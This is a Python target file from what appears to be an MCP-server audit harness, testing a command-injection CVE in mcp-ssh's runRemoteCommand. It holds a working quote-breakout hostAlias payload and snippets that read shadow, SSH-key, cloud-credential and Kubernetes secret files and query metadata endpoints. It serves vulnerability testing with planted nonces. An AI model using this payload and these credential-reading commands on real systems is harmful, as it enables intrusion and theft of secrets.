"""CVE-2025-9654: OS command injection in @aiondadotcom/mcp-ssh runRemoteCommand (CWE-74).

The vulnerable server (1.0.3) builds its ssh/scp command lines by string concatenation and runs
them through child_process.exec (a shell), e.g. `ssh "${hostAlias}" "${command}"` in
runRemoteCommand. hostAlias is not escaped at all, so a crafted hostAlias such as
`nohost"; <cmd>; true #` breaks out of the quotes and runs an arbitrary local OS command inside
the server container, whose stdout is returned in the tool response. The first fixed version
(1.0.4) calls child_process.execFile('ssh', [hostAlias, command]) with no shell, so every payload
is passed as a single literal ssh hostname argument and no metacharacter is interpreted.

The flaw is general command execution, so the exploit surfaces a planted nonce from every place
the executed command can reach and the server does not read itself.
"""

import re
from collections.abc import Awaitable, Callable

from evals.cve_environments import command_injection_env
from evals.cve_grammar import MechanismClass
from evals.cve_places import Coordinates, Places, PlantKind
from evals.cve_planting import PlantingHost, SymbolicUser
from evals.cve_targets import CVETarget
from mcp_auditor.domain.ports import MCPClientPort

# command_execution-reachable, plantable places the server does not read itself.
KEPT_PLACES: tuple[str, ...] = (
    "process-account-identity",
    "etc-shadow",
    "container-hostname",
    "aws-credentials",
    "gcloud-adc",
    "azure-profile",
    "ssh-private-key",
    "shell-history",
    "git-credentials",
    "npmrc",
    "gh-hosts",
    "docker-config",
    "kube-config",
    "pgpass",
    "mysql-client-cnf",
    "mongorc",
    "mysql-system-cnf",
    "proc-environ",
    "run-secrets",
    "k8s-sa-token",
    "etc-hosts",
    "auth-log",
    "imds",
    "ecs-task-credentials",
    "eks-pod-identity",
)

# Every exploit hostAlias carries the `";` breakout; the benign listKnownHosts call never does.
AIM = re.compile(r'";')


def _injection(snippet: str) -> str:
    # Break out of `ssh "<hostAlias>" "<command>"`: `ssh "nohost"` fails to stderr, `snippet`
    # runs to stdout, `true` forces exit 0, and `#` comments out the trailing `" "<command>"`.
    return f'nohost"; {snippet}; true #'


def _snippet_for(coord: Coordinates) -> str:
    if coord.kind is PlantKind.FILE:
        paths = coord.paths if coord.paths is not None else (coord.path,)
        return "; ".join(f"cat {p} 2>/dev/null" for p in paths)
    if coord.kind is PlantKind.ENV:
        return f"printenv {coord.name}"
    if coord.kind is PlantKind.ACCOUNT:
        return "id -un; getent passwd $(id -u) 2>/dev/null"
    if coord.kind is PlantKind.HOSTNAME:
        return "cat /etc/hostname 2>/dev/null; hostname"
    if coord.kind is PlantKind.HTTP_ENDPOINT:
        url = f"http://{coord.host}{coord.path}"
        return f"wget -qO- -T 8 '{url}'"
    raise ValueError(f"no command-execution snippet for kind {coord.kind}")


def _exploit(place_id: str) -> Callable[[Places, MCPClientPort], Awaitable[None]]:
    async def run(places: Places, client: MCPClientPort) -> None:
        host_alias = _injection(_snippet_for(places[place_id].coordinates))
        await client.call_tool(
            "runRemoteCommand", {"hostAlias": host_alias, "command": "echo probe"}
        )

    return run


async def _benign(places: Places, client: MCPClientPort) -> None:
    await client.call_tool("listKnownHosts", {})


TARGET = CVETarget(
    cve_id="CVE-2025-9654",
    severity="CVSS 8.8 (v3.1, placeholder)",
    mechanism=MechanismClass.COMMAND_EXECUTION,
    aim=AIM,
    reaches=frozenset({"command_execution"}),
    kept_places=KEPT_PLACES,
    images=("holdout-2025-9654-mcp-ssh",),
    server_image="holdout-2025-9654-mcp-ssh",
    patched_image="holdout-2025-9654-mcp-ssh-patched",
    planting_host=PlantingHost(SymbolicUser.UNPRIVILEGED, "/", has_network=False),
    builder=command_injection_env,
    exploits=tuple(_exploit(place_id) for place_id in KEPT_PLACES),
    benign=_benign,
    awaited_capability=None,
    note=(
        "OS command injection (CWE-74): runRemoteCommand interpolates the attacker-controlled "
        'hostAlias into an `ssh "<hostAlias>" ...` line run through a shell, so a quote-breakout '
        "hostAlias executes an arbitrary command in the server's container."
    ),
    tools_filter=None,
    ci_skip_reason=None,
)
